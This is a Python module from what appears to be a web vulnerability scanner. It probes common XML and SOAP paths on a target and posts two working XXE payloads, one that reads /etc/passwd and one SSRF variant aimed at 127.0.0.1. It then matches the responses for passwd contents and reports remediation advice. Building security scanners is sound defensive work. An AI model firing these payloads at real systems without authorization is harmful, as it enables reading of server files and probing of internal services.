from __future__ import annotations

import re

import requests
from bs4 import BeautifulSoup

from .base import BaseScanModule, Finding

# XXE DTD payload (CBBH 15: Web Attacks -- XXE)
XXE_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

# Blind SSRF via XXE -- using http:// instead of file://
XXE_SSRF_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/">
]>
<root><data>&xxe;</data></root>"""

# Indicators that XXE file exfiltration succeeded
XXE_SUCCESS_PATTERNS = [
    r"root:.*:0:0:",
    r"daemon:.*:/usr/sbin",
    r"nobody:",
    r"/bin/bash",
    r"/bin/sh",
]

# Content-types that suggest XML processing
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]


class XXEScanner(BaseScanModule):
    name = "xxe"
    description = "Detect XML-consuming endpoints and test for XXE via DTD external entity injection"

    def run(self, url: str) -> list[Finding]:
        findings: list[Finding] = []

        # Find XML-consuming endpoints: forms with enctype, and probe API endpoints
        xml_endpoints = self._discover_xml_endpoints(url)

        if not xml_endpoints:
            findings.append(Finding(
                check="XXE",
                result="INFO",
                severity="Info",
                evidence="No obvious XML-consuming endpoints detected on the target page.",
                detail="XXE requires XML parsing on the server. Check for SOAP/API endpoints manually.",
            ))
            return findings

        for endpoint in xml_endpoints:
            result = self._test_xxe(endpoint)
            if result:
                findings.append(result)
            else:
                findings.append(Finding(
                    check="XXE",
                    result="SECURE",
                    severity="Info",
                    evidence=f"XXE payload rejected or not reflected at {endpoint}",
                ))

        return findings

    def _discover_xml_endpoints(self, url: str) -> list[str]:
        endpoints = set()
        base = url.rstrip("/")

        # Common XML/SOAP API paths to probe
        xml_paths = [
            "/api", "/api/v1", "/soap", "/wsdl", "/xmlrpc.php",
            "/api/xml", "/feed", "/rss", "/atom",
        ]

        try:
            resp = requests.get(url, timeout=self.timeout, verify=False)

            # Check if the page itself accepts XML (by content-type hint or form enctype)
            soup = BeautifulSoup(resp.text, "html.parser")
            for form in soup.find_all("form"):
                enctype = form.get("enctype", "")
                if "xml" in enctype.lower():
                    action = form.get("action", url)
                    full_action = action if action.startswith("http") else base + "/" + action.lstrip("/")
                    endpoints.add(full_action)

        except requests.RequestException:
            pass

        # Probe known XML API paths
        for path in xml_paths:
            try:
                resp = requests.get(base + path, timeout=self.timeout, verify=False,
                                    allow_redirects=False)
                if resp.status_code in (200, 405):
                    ct = resp.headers.get("Content-Type", "")
                    if any(x in ct for x in XML_CONTENT_TYPES) or "xml" in resp.text[:200].lower():
                        endpoints.add(base + path)
                # Also try POSTing with XML content-type to see if it's accepted
                resp2 = requests.post(base + path,
                                      data="<test/>",
                                      headers={"Content-Type": "application/xml"},
                                      timeout=self.timeout, verify=False,
                                      allow_redirects=False)
                if resp2.status_code not in (404, 410):
                    endpoints.add(base + path)
            except requests.RequestException:
                continue

        return list(endpoints)

    def _test_xxe(self, endpoint: str) -> Finding | None:
        for payload, label in [(XXE_PAYLOAD, "file exfil"), (XXE_SSRF_PAYLOAD, "blind SSRF")]:
            try:
                resp = requests.post(
                    endpoint,
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=self.timeout,
                    verify=False,
                )
                for pattern in XXE_SUCCESS_PATTERNS:
                    if re.search(pattern, resp.text, re.IGNORECASE):
                        return Finding(
                            check="XXE (XML External Entity Injection)",
                            result="VULNERABLE",
                            severity="Critical",
                            evidence=f"XXE {label} confirmed at {endpoint}. "
                                     f"Response contains: {resp.text[:200]}",
                            detail=(
                                "External entity processing is enabled. "
                                "Attacker reads /etc/passwd, /var/www/html/config.php, and /.env. "
                                "Can escalate to blind SSRF to probe internal services. "
                                "Fix (CBBH): update XML libraries (libxml2, etc.); "
                                "disable external entity processing in XML parser config; "
                                "disable DTD references; switch to JSON/REST APIs where possible; "
                                "never display XML parser errors to users."
                            ),
                            raw_request=f"POST {endpoint}\nContent-Type: application/xml\n\n{payload[:300]}",
                            raw_response=resp.text[:400],
                        )
            except requests.RequestException:
                continue
        return None
